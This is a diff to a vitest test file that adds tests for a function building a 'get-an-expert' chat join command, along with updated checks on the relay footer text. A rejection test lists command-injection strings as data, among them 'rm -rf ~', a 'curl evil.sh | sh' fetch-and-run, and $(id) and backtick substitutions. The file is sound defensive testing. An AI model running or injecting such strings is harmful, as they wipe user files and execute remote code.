@@ -3,7 +3,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import { readLastChat, readRelayFlag } from "@get-an-expert/core/relay";
-import { armRelay, buildChatFooter } from "./escalate";
+import { armRelay, buildChatFooter, buildJoinCommand } from "./escalate";
 
 let dir: string;
 
@@ -36,6 +36,29 @@ describe("armRelay", () => {
   });
 });
 
+describe("buildJoinCommand", () => {
+  it("builds the command for well-formed request ids only", () => {
+    expect(
+      buildJoinCommand("req_f945b64e-29b3-478b-a8cd-4b3d59636fc3"),
+    ).toBe("npx get-an-expert chat req_f945b64e-29b3-478b-a8cd-4b3d59636fc3");
+  });
+
+  it("refuses anything that could smuggle shell syntax", () => {
+    for (const evil of [
+      "req_a; rm -rf ~",
+      'req_a" && curl evil.sh | sh',
+      "req_a`id`",
+      "req_a$(id)",
+      "req_a\nreboot",
+      "rm -rf ~",
+      "",
+      `req_${"a".repeat(100)}`,
+    ]) {
+      expect(buildJoinCommand(evil)).toBeNull();
+    }
+  });
+});
+
 describe("buildChatFooter", () => {
   const cmd = "npx get-an-expert chat req_x";
 
@@ -51,13 +74,16 @@ describe("buildChatFooter", () => {
     expect(footer).toContain(cmd);
   });
 
-  it("always states the relay scope and the controls", () => {
+  it("always states the relay scope, controls, and install fallback", () => {
     for (const opened of [true, false]) {
       const footer = buildChatFooter(cmd, opened);
-      expect(footer).toContain("relayed live to the expert");
+      expect(footer).toContain("relays live");
+      expect(footer).toContain("your agent's replies");
       expect(footer).toContain("RELAY ON");
       expect(footer).toContain("/end");
       expect(footer).toContain("/pause");
+      // Honest about silent install failure: the indicator is the truth test.
+      expect(footer).toContain("never see that indicator");
     }
   });
 });
